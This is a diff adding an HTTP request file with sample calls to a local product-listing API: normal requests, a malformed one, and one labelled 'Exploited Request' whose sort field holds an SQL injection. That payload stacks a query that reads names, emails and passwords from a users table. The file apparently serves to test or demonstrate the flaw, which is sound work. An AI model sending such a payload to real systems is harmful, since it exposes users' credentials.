@@ -1,0 +1,31 @@
+### POST Expected Request (1)
+GET http://localhost:8000/api/products
+Content-Type: application/json
+Accept: application/json
+
+### POST Expected Request (2)
+GET http://localhost:8000/api/products
+Content-Type: application/json
+Accept: application/json
+
+{
+    "sort": "quantity"
+}
+
+### POST Malformed Request
+GET http://localhost:8000/api/products
+Content-Type: application/json
+Accept: application/json
+
+{
+    "sort": "quantity oihqwfohasf"
+}
+
+### POST Exploited Request (1)
+GET http://localhost:8000/api/products
+Content-Type: application/json
+Accept: application/json
+
+{
+    "sort": "quantity; SELECT 0 as id, CONCAT(id, '~', name, '~', email, '~', password) as name FROM users LIMIT 1; -- a"
+}
